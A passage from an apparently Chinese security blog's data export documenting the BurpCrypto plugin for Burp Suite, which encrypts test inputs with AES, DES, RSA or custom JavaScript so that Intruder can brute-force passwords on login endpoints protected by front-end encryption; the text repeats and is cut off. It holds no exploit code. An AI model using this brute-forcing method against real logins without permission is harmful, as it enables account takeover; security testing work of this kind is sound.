title=\"六、编码方式的辨别方法\"></a><strong>六、编码方式的辨别方法</strong></h4><blockquote>\n<p>为了照顾到对编码方式不了解的朋友，此处会简单讲解这些编码方式的辨别方法，已经了解的朋友可直接跳过参阅下一章节的具体使用讲解.</p>\n</blockquote>\n<p>Base64编码与HEX编码常常用于编码二进制数据，UTF8String则是我们操作系统、网页中最常见的字符串的编码方式，下方是Base64、HEX、UTF8String编码的示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">对字符串&quot;test_z&quot;进行Base64、HEX编码的结果  </span><br><span class=\"line\">Base64：dGVzdF96  </span><br><span class=\"line\">HEX：746573745f7a  </span><br><span class=\"line\">UTF8String：test_z</span><br></pre></td></tr></table></figure>\n\n<p>AES和DES加密都属于对称加密算法，既加解密使用同一套密钥的加密算法，同时也是目前前端加密中较为常见的加密算法，目前插件支持的AES加密算法有：</p>\n<ul>\n<li><p>AES&#x2F;CBC&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;CBC&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;CBC&#x2F;ZeroPadding</p>\n</li>\n<li><p>AES&#x2F;ECB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;ECB&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;ECB&#x2F;ZeroPadding</p>\n</li>\n<li><p>AES&#x2F;OFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;OFB&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;OFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>AES&#x2F;CFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;CFB&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;CFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>AES&#x2F;CTR&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;CTR&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;CTR&#x2F;ZeroPadding</p>\n</li>\n</ul>\n<p>DES加密算法有：</p>\n<ul>\n<li><p>DES&#x2F;CBC&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DES&#x2F;CBC&#x2F;ZeroPadding</p>\n</li>\n<li><p>DES&#x2F;CBC&#x2F;NoPadding</p>\n</li>\n<li><p>DES&#x2F;ECB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DES&#x2F;ECB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DES&#x2F;ECB&#x2F;NoPadding</p>\n</li>\n<li><p>DES&#x2F;OFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DES&#x2F;OFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DES&#x2F;OFB&#x2F;NoPadding</p>\n</li>\n<li><p>DES&#x2F;CFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DES&#x2F;CFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DES&#x2F;CFB&#x2F;NoPadding</p>\n</li>\n<li><p>DESede&#x2F;CBC&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DESede&#x2F;CBC&#x2F;ZeroPadding</p>\n</li>\n<li><p>DESede&#x2F;CBC&#x2F;NoPadding</p>\n</li>\n<li><p>DESede&#x2F;ECB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DESede&#x2F;ECB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DESede&#x2F;ECB&#x2F;NoPadding</p>\n</li>\n<li><p>DESede&#x2F;OFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DESede&#x2F;OFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DESede&#x2F;OFB&#x2F;NoPadding</p>\n</li>\n<li><p>DESede&#x2F;CFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DESede&#x2F;CFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DESede&#x2F;CFB&#x2F;NoPadding</p>\n</li>\n<li><p>strEnc</p>\n</li>\n</ul>\n<blockquote>\n<p>在前端JS中常常会使用PKCS7Padding，在本模块中可使用PKCS5Padding代替，不影响使用。</p>\n<p>DES加密中的strEnc算法是取自作者Guapo的一种3DES的模块，在少数系统中被使用，此处为了方便使用也引入了进来。</p>\n</blockquote>\n<h4 id=\"非对称加密算法\"><a href=\"#非对称加密算法\" class=\"headerlink\" title=\"非对称加密算法\"></a>非对称加密算法</h4><p>RSA算法则属于非对称加密算法，密钥分为公钥与私钥，暂时仅支持公钥加密，RSA加密支持两种公钥格式的输入，分别为</p>\n<ul>\n<li><p>X509</p>\n</li>\n<li><p>ModulusAndExponent</p>\n</li>\n</ul>\n<p>X509密钥格式表现为一串由Base64编码后的字符串，常常以<code>MIG</code>开头。ModulusAndExponent(模数，指数)则表现为两个HEX编码的参数，Modulus是模数，常常较长，Exponent是指数，常常只有6位，以下为密钥示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">X509: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCC0hrRIjb3noDWNtbDpANbjt5Iwu2NFeDwU16Ec87ToqeoIm2KI+cOs81JP9aTDk/jkAlU97mN8wZkEMDr5utAZtMVht7GLX33Wx9XjqxUsDfsGkqNL8dXJklWDu9Zh80Ui2Ug+340d5dZtKtd+nv09QZqGjdnSp9PTfFDBY133QIDAQAB  </span><br><span class=\"line\">ModulusAndExponent:  </span><br><span class=\"line\">  Modulus: A1E4D93618B8B240530853E87738403851E15BBB77421F9B2377FB0B4F1C6FC235EAEC92EA25BB76AC221DCE90173A2E232FE1511909C76B15251D4059B288E709C1EF86BCF692757AAD736882DD1E98BEDFED9311A3C22C40657C9A52880BDC4B9E539041D44D52CB26AD13AB086F7DC294D144D6633A62EF91CA1775EB9A09  </span><br><span class=\"line\">  Exponent: 010001</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h4 id=\"七、使用\"><a href=\"#七、使用\" class=\"headerlink\" title=\"七、使用\"></a><strong>七、使用</strong></h4><h4 id=\"使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击Add-processor，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示Apply-processor-success-即表示添加成功。\"><a href=\"#使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击Add-processor，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示Apply-processor-success-即表示添加成功。\" class=\"headerlink\" title=\"使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击Add processor，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示Apply processor success!即表示添加成功。\"></a>使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击<code>Add processor</code>，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示<code>Apply processor success!</code>即表示添加成功。</h4><p>此处以AES的CBC模式，填充Pkcs7，Key：Y3MxMTg1MzUyOS4x，IV：9875643210132456，Base64编码的方式做为示例。</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/2.png\"></p>\n<p>若要删除processor则要点击<code>Remove processor</code>，输入刚刚编写的配置名，即可删除。</p>\n<blockquote>\n<p>关于前端加密的分析过程可参阅jsEncrypter开发者c0ny1的文章：<a href=\"https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/\">https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/</a></p>\n</blockquote>\n<p><strong>八、补充阅读</strong></p>\n<p>对单加密参数的登录接口进行密码爆破的一种方法，ExecJS模块使用由于软件开发的复杂性，诸如多层嵌套加密、引入时间变量、动态密钥、魔改加密算法、新算法的涌现，插件注定永远无法做到对所有加密算法的百分百覆盖，所以提供了ExecJS模块，为动手能力较强的使用者提供一条新途径。</p>\n<blockquote>\n<p>因JS新特性的快速迭代，插件中内置了Rhino、HtmlUnit、Jre内置三种JS执行引擎，各种执行引擎的优劣势可参阅BurpCrypto未来开发计划中对于各个引擎的特性介绍。</p>\n</blockquote>\n<h3 id=\"九、编写简单的JS脚本\"><a href=\"#九、编写简单的JS脚本\" class=\"headerlink\" title=\"九、编写简单的JS脚本\"></a><strong>九、编写简单的JS脚本</strong></h3><h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"使用ExecJS模块前需要先切换至插件的ExecJS选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理-加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。\"><a href=\"#使用ExecJS模块前需要先切换至插件的ExecJS选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理-加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。\" class=\"headerlink\" title=\"使用ExecJS模块前需要先切换至插件的ExecJS选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理&#x2F;加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。\"></a>使用ExecJS模块前需要先切换至插件的<code>ExecJS</code>选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理&#x2F;加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。</h3><p>为了方便使用，插件内置了一个快速生成函数体的菜单，在代码编辑器中的右键菜单中点击<code>Append Simple Function</code>，即可生成一个空函数<code>calc</code>，并自动在下面的入口函数名填写入口函数为<code>calc</code>。</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/3.png\"></p>\n<p>我们可以对该函数进行一些简单的修改，下面是一个示例脚本，该脚本将会把输入的内容倒转后再返回。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">function calc(pass) &#123;  </span><br><span class=\"line\">     return pass.split(&quot;&quot;).reverse().join(&quot;&quot;);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编辑完成后，点击<code>Add processor</code>即可添加成功。</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/4.png\"></p>\n<h3 id=\"十、引用内置JS库\"><a href=\"#十、引用内置JS库\" class=\"headerlink\" title=\"十、引用内置JS库\"></a><strong>十、引用内置JS库</strong></h3><blockquote>\n<p>目前内置的JS库只有MD5与Base64，后续版本将会上线在线JS仓库，操作步骤将会发生变动。</p>\n</blockquote>\n<p>为避免常见库的频繁整理导入的工作量，插件目前内置了MD5和Base64库，使用方法为在编辑器的右键菜单中的<code>Include Snippet</code>选中需要的JS库，即可引入。</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/5.png\"></p>\n<p><strong>十一、在功能区中调用插件</strong></p>\n<p>加密，通过在上述几个模块中成功添加processor后，即可通过以下两个渠道进行使用。</p>\n<p>QuickCrypto（全局调用）</p>\n<p>BurpCrypto几乎可以在BurpSuite的任何位置进行调用，调用方法也较为简单，以下动图为示例：</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/6.png\"></p>\n<p><strong>十二、Intruder（爆破模块）</strong></p>\n<p>在爆破模块中引用：</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/7.png\"></p>\n<h3 id=\"十三、解密（查询原文）\"><a href=\"#十三、解密（查询原文）\" class=\"headerlink\" title=\"十三、解密（查询原文）\"></a><strong>十三、解密（查询原文）</strong></h3><p>由于部分算法产生的结果具有不可逆性（哈希算法、自定义的JS代码等），所以通过本插件生成的所有结果均被保存到本地的K&#x2F;V数据库中，可以通过插件中的<code>Get PlainText</code>功能获取原始明文。</p>\n<p>使用方法为完整选中密文内容，右单击后找到BurpCrypto菜单中的<code>Get PlainText</code>功能，</p>\n<blockquote>\n<p>此处演示的是RSA公钥加密后通过密文查询原始明文。</p>\n</blockquote>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/8.png\"></p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/9.png\"></p>\n<p><strong>十四、结尾</strong></p>\n<p>以上为本插件的使用说明，后续将会将会陆续加入国密算法、ExecJS远程模块，模块互调等小功能更新与Bug修复，如果各位师傅有更多的建议也欢迎提PR或者Issure，谢谢！</p>\n<p><strong><strong>本文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！</strong></strong></p>\n","cover":"/img/haibian.png","cover_type":"img","excerpt":"","more":"<p>BurpCrypto是一款支持多种加密算法、或直接执行浏览器JS代码的BurpSuit插件。</p>\n<p><strong>一、编译</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn package</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>二、为什么解决了痛点</strong></p>\n<p>目前越来越多的网站系统在登录接口、数据请求接口中加入各式各样的加密算法，甚至有些网站在每次请求前都动态请求加密密钥等措施，对接口渗透工作造成较大障碍。依赖于BurpSuite中的那些编码方式、Hash算法已经远远不够，通过BurpCrypto内置的RSA、AES、DES模块可应对较为简单的前端加密接口，较为复杂的加密算法，可使用ExecJS模块直接手动编写处理代码。同时为了降低ExecJS模块的上手难度，未来将推出远程JS模块仓库，支持远程加载已经测试通过的JS功能代码，方便直接调用。</p>\n<p><strong>三、未来开发计划</strong></p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/1.png\"></p>\n<p>BurpCrypto可从其官方Github页面进行下载已编译好的版本，或下载源代码本地编译，然后在BurpSuite的扩展列表中添加插件，等待Output中输出<code>BurpCrypto loaded successfully!</code>则表示插件加载成功。</p>\n<hr>\n<h2 id=\"五、基础加密模块使用\"><a href=\"#五、基础加密模块使用\" class=\"headerlink\" title=\"五、基础加密模块使用\"></a><strong>五、基础加密模块使用</strong></h2><h2 id=\"基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种\"><a href=\"#基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种\" class=\"headerlink\" title=\"基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种\"></a>基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种</h2><ul>\n<li><p>Base64</p>\n</li>\n<li><p>HEX</p>\n</li>\n<li><p>UTF8String</p>\n</li>\n</ul>\n<p>密文输出所支持的编码方式有如下两种</p>\n<ul>\n<li><p>Base64</p>\n</li>\n<li><p>HEX</p>\n</li>\n</ul>\n<p>ExecJS模块的输出内容由JS代码决定。</p>\n<h4 id=\"六、编码方式的辨别方法\"><a href=\"#六、编码方式的辨别方法\" class=\"headerlink\" title=\"六、编码方式的辨别方法\"></a><strong>六、编码方式的辨别方法</strong></h4><blockquote>\n<p>为了照顾到对编码方式不了解的朋友，此处会简单讲解这些编码方式的辨别方法，已经了解的朋友可直接跳过参阅下一章节的具体使用讲解.</p>\n</blockquote>\n<p>Base64编码与HEX编码常常用于编码二进制数据，UTF8String则是我们操作系统、网页中最常见的字符串的编码方式，下方是Base64、HEX、UTF8String编码的示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">对字符串&quot;test_z&quot;进行Base64、HEX编码的结果  </span><br><span class=\"line\">Base64：dGVzdF96  </span><br><span class=\"line\">HEX：746573745f7a  </span><br><span class=\"line\">UTF8String：test_z</span><br></pre></td></tr></table></figure>\n\n<p>AES和DES加密都属于对称加密算法，既加解密使用同一套密钥的加密算法，同时也是目前前端加密中较为常见的加密算法，目前插件支持的AES加密算法有：</p>\n<ul>\n<li><p>AES&#x2F;CBC&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;CBC&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;CBC&#x2F;ZeroPadding</p>\n</li>\n<li><p>AES&#x2F;ECB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;ECB&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;ECB&#x2F;ZeroPadding</p>\n</li>\n<li><p>AES&#x2F;OFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;OFB&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;OFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>AES&#x2F;CFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;CFB&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;CFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>AES&#x2F;CTR&#x2F;PKCS5Padding</p>\n</li>\n<li><p>AES&#x2F;CTR&#x2F;NoPadding</p>\n</li>\n<li><p>AES&#x2F;CTR&#x2F;ZeroPadding</p>\n</li>\n</ul>\n<p>DES加密算法有：</p>\n<ul>\n<li><p>DES&#x2F;CBC&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DES&#x2F;CBC&#x2F;ZeroPadding</p>\n</li>\n<li><p>DES&#x2F;CBC&#x2F;NoPadding</p>\n</li>\n<li><p>DES&#x2F;ECB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DES&#x2F;ECB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DES&#x2F;ECB&#x2F;NoPadding</p>\n</li>\n<li><p>DES&#x2F;OFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DES&#x2F;OFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DES&#x2F;OFB&#x2F;NoPadding</p>\n</li>\n<li><p>DES&#x2F;CFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DES&#x2F;CFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DES&#x2F;CFB&#x2F;NoPadding</p>\n</li>\n<li><p>DESede&#x2F;CBC&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DESede&#x2F;CBC&#x2F;ZeroPadding</p>\n</li>\n<li><p>DESede&#x2F;CBC&#x2F;NoPadding</p>\n</li>\n<li><p>DESede&#x2F;ECB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DESede&#x2F;ECB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DESede&#x2F;ECB&#x2F;NoPadding</p>\n</li>\n<li><p>DESede&#x2F;OFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DESede&#x2F;OFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DESede&#x2F;OFB&#x2F;NoPadding</p>\n</li>\n<li><p>DESede&#x2F;CFB&#x2F;PKCS5Padding</p>\n</li>\n<li><p>DESede&#x2F;CFB&#x2F;ZeroPadding</p>\n</li>\n<li><p>DESede&#x2F;CFB&#x2F;NoPadding</p>\n</li>\n<li><p>strEnc</p>\n</li>\n</ul>\n<blockquote>\n<p>在前端JS中常常会使用PKCS7Padding，在本模块中可使用PKCS5Padding代替，不影响使用。</p>\n<p>DES加密中的strEnc算法是取自作者Guapo的一种3DES的模块，在少数系统中被使用，此处为了方便使用也引入了进来。</p>\n</blockquote>\n<h4 id=\"非对称加密算法\"><a href=\"#非对称加密算法\" class=\"headerlink\" title=\"非对称加密算法\"></a>非对称加密算法</h4><p>RSA算法则属于非对称加密算法，密钥分为公钥与私钥，暂时仅支持公钥加密，RSA加密支持两种公钥格式的输入，分别为</p>\n<ul>\n<li><p>X509</p>\n</li>\n<li><p>ModulusAndExponent</p>\n</li>\n</ul>\n<p>X509密钥格式表现为一串由Base64编码后的字符串，常常以<code>MIG</code>开头。ModulusAndExponent(模数，指数)则表现为两个HEX编码的参数，Modulus是模数，常常较长，Exponent是指数，常常只有6位，以下为密钥示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">X509: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCC0hrRIjb3noDWNtbDpANbjt5Iwu2NFeDwU16Ec87ToqeoIm2KI+cOs81JP9aTDk/jkAlU97mN8wZkEMDr5utAZtMVht7GLX33Wx9XjqxUsDfsGkqNL8dXJklWDu9Zh80Ui2Ug+340d5dZtKtd+nv09QZqGjdnSp9PTfFDBY133QIDAQAB  </span><br><span class=\"line\">ModulusAndExponent:  </span><br><span class=\"line\">  Modulus: A1E4D93618B8B240530853E87738403851E15BBB77421F9B2377FB0B4F1C6FC235EAEC92EA25BB76AC221DCE90173A2E232FE1511909C76B15251D4059B288E709C1EF86BCF692757AAD736882DD1E98BEDFED9311A3C22C40657C9A52880BDC4B9E539041D44D52CB26AD13AB086F7DC294D144D6633A62EF91CA1775EB9A09  </span><br><span class=\"line\">  Exponent: 010001</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h4 id=\"七、使用\"><a href=\"#七、使用\" class=\"headerlink\" title=\"七、使用\"></a><strong>七、使用</strong></h4><h4 id=\"使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击Add-processor，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示Apply-processor-success-即表示添加成功。\"><a href=\"#使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击Add-processor，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示Apply-processor-success-即表示添加成功。\" class=\"headerlink\" title=\"使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击Add processor，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示Apply processor success!即表示添加成功。\"></a>使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击<code>Add processor</code>，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示<code>Apply processor success!</code>即表示添加成功。</h4><p>此处以AES的CBC模式，填充Pkcs7，Key：Y3MxMTg1MzUyOS4x，IV：9875643210132456，Base64编码的方式做为示例。</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/2.png\"></p>\n<p>若要删除processor则要点击<code>Remove processor</code>，输入刚刚编写的配置名，即可删除。</p>\n<blockquote>\n<p>关于前端加密的分析过程可参阅jsEncrypter开发者c0ny1的文章：<a href=\"https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/\">https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/</a></p>\n</blockquote>\n<p><strong>八、补充阅读</strong></p>\n<p>对单加密参数的登录接口进行密码爆破的一种方法，ExecJS模块使用由于软件开发的复杂性，诸如多层嵌套加密、引入时间变量、动态密钥、魔改加密算法、新算法的涌现，插件注定永远无法做到对所有加密算法的百分百覆盖，所以提供了ExecJS模块，为动手能力较强的使用者提供一条新途径。</p>\n<blockquote>\n<p>因JS新特性的快速迭代，插件中内置了Rhino、HtmlUnit、Jre内置三种JS执行引擎，各种执行引擎的优劣势可参阅BurpCrypto未来开发计划中对于各个引擎的特性介绍。</p>\n</blockquote>\n<h3 id=\"九、编写简单的JS脚本\"><a href=\"#九、编写简单的JS脚本\" class=\"headerlink\" title=\"九、编写简单的JS脚本\"></a><strong>九、编写简单的JS脚本</strong></h3><h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"使用ExecJS模块前需要先切换至插件的ExecJS选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理-加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。\"><a href=\"#使用ExecJS模块前需要先切换至插件的ExecJS选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理-加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。\" class=\"headerlink\" title=\"使用ExecJS模块前需要先切换至插件的ExecJS选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理&#x2F;加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。\"></a>使用ExecJS模块前需要先切换至插件的<code>ExecJS</code>选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理&#x2F;加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。</h3><p>为了方便使用，插件内置了一个快速生成函数体的菜单，在代码编辑器中的右键菜单中点击<code>Append Simple Function</code>，即可生成一个空函数<code>calc</code>，并自动在下面的入口函数名填写入口函数为<code>calc</code>。</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/3.png\"></p>\n<p>我们可以对该函数进行一些简单的修改，下面是一个示例脚本，该脚本将会把输入的内容倒转后再返回。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">function calc(pass) &#123;  </span><br><span class=\"line\">     return pass.split(&quot;&quot;).reverse().join(&quot;&quot;);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编辑完成后，点击<code>Add processor</code>即可添加成功。</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/4.png\"></p>\n<h3 id=\"十、引用内置JS库\"><a href=\"#十、引用内置JS库\" class=\"headerlink\" title=\"十、引用内置JS库\"></a><strong>十、引用内置JS库</strong></h3><blockquote>\n<p>目前内置的JS库只有MD5与Base64，后续版本将会上线在线JS仓库，操作步骤将会发生变动。</p>\n</blockquote>\n<p>为避免常见库的频繁整理导入的工作量，插件目前内置了MD5和Base64库，使用方法为在编辑器的右键菜单中的<code>Include Snippet</code>选中需要的JS库，即可引入。</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/5.png\"></p>\n<p><strong>十一、在功能区中调用插件</strong></p>\n<p>加密，通过在上述几个模块中成功添加processor后，即可通过以下两个渠道进行使用。</p>\n<p>QuickCrypto（全局调用）</p>\n<p>BurpCrypto几乎可以在BurpSuite的任何位置进行调用，调用方法也较为简单，以下动图为示例：</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/6.png\"></p>\n<p><strong>十二、Intruder（爆破模块）</strong></p>\n<p>在爆破模块中引用：</p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/7.png\"></p>\n<h3 id=\"十三、解密（查询原文）\"><a href=\"#十三、解密（查询原文）\" class=\"headerlink\" title=\"十三、解密（查询原文）\"></a><strong>十三、解密（查询原文）</strong></h3><p>由于部分算法产生的结果具有不可逆性（哈希算法、自定义的JS代码等），所以通过本插件生成的所有结果均被保存到本地的K&#x2F;V数据库中，可以通过插件中的<code>Get 